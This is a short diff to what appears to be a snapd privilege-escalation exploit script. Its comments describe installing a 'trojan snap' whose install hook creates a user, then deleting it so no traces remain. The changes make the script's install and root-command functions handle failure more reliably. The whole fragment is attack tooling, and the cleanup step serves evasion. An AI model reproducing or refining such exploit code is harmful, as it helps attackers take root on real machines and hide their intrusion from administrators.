@@ -174,13 +174,15 @@ Content-Type: application/octet-stream
     # Exit on failure
     if 'status-code":202' not in http_reply:
         LOG.info("[!] Did not work, here is the API reply:\n\n")
-        # LOG.info(http_reply) debug output
+        LOG.info(http_reply) #debug output
         return False
 
     # Sleep to allow time for the snap to install correctly. Otherwise,
     # The uninstall that follows will fail, leaving unnecessary traces
     # on the machine.
+
     time.sleep(8)
+    return True
 
 
 def runCommandAsRoot(command):
@@ -204,7 +206,8 @@ def runCommandAsRoot(command):
         return False
 
     # Install the trojan snap, which has an install hook that creates a user
-    install_snap(client_sock, TROJAN_SNAP)
+    if not install_snap(client_sock, TROJAN_SNAP):
+        return False
 
     # Delete the trojan snap
     if not delete_snap(client_sock):
